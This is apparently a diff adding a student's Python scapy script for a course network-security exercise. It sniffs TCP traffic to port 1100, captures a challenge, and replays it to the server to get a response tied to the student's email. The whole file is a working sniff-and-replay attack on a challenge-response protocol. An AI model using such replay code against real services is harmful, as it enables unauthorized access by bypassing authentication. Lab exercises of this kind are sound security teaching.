@@ -1,0 +1,83 @@
+#! /usr/bin/env python3
+from scapy.all import *
+import logging
+import time
+from struct import *
+import json
+import base64
+import sys
+
+INTERFACE = None
+if len(sys.argv) > 1:
+    INTERFACE = str(sys.argv[1])
+else:
+    INTERFACE = "lo"
+PACKET_FILTER = "tcp and dst port 1100"
+CHALLENGE = None
+CHALLENGE_SIZE = 32
+lengths = [-1] #-1 is not set, 2 is capture the next packet because its the challenge, -2 is the challenge has been captured 
+
+def send_challenge(chal, ip):
+    # create the socket connection
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((str(ip), 1100))
+
+    # length of the challenge, converted to 2 big endian bytes
+    length = int(len(chal)/2).to_bytes(2, "big") 
+    # challenge that was intercepted 
+    challenge_string = str(chal) # string of characters representing bytes in the challenge
+    # print(f'challenge string: {challenge_string}')
+
+    chal_to_send = b'' # converting the string to actual bytes to send 
+    for i in range(int(len(challenge_string) / 2)):
+        chal_to_send += int(challenge_string[2*i: 2*i + 2], 16).to_bytes(1, 'big')
+    # print(f'challenge to send: {chal_to_send}')
+
+    # email and length 
+    email = bytes("holmes.ga@northeastern.edu", 'utf-8')
+    email_length = int(26).to_bytes(2, "big")
+
+    # The entire message to send 
+    complete_message = length + chal_to_send + email_length + email
+    s.sendall(complete_message)
+    time.sleep(0.2)
+
+    # Read in the response 
+    response = s.recv(2048)
+    r = base64.b64encode(response)    
+    data = '{"id": "holmes.ga@northeastern.edu", "value": "' + str(r)[2:-1] + '"}'
+    print(json.loads(data))
+def on_packet(p):
+        if lengths[0] == -2:
+            return
+	# Check that it's a TCP packet and has a payload
+        if TCP not in p:
+            return
+        payload = bytes(p[TCP].payload)
+        if len(payload) > 0:
+            # print(f'Length of payload: {len(payload)}\nPayload hex: {payload.hex()}')
+            if lengths[0] == 2 and len(payload) > 2:
+                CHALLENGE = payload.hex()
+                #print("returning challenge")
+                lengths[0] = -2
+                ip = p[IP].dst
+                send_challenge(CHALLENGE, ip)
+                return 
+            if len(payload) == 2:
+                # Message containing length of challenge
+                lengths[0] = 2
+
+def main():
+	logging.basicConfig(level=logging.INFO)
+	logging.getLogger("scapy").setLevel(logging.CRITICAL)
+
+	#Sniff challenge
+	sniff(prn=on_packet, filter=PACKET_FILTER, iface=INTERFACE, store=False)
+        # the packets will tell you where the target is, so pull that out of the payload
+        # something like p[ip].target_ip thats the idea look at the scapy docs
+        # s = socket.creat_connection(("127.0.0.1", 1100))
+        # s.sendall(len(CHALLENGE).to_bytes(...)) this won't be big endian, 2 bytes
+        # or can use struct.pack(">H", len(CHALLENGE))
+        # s.sendall(CHALLENGE))
+if __name__ == '__main__':
+	main()
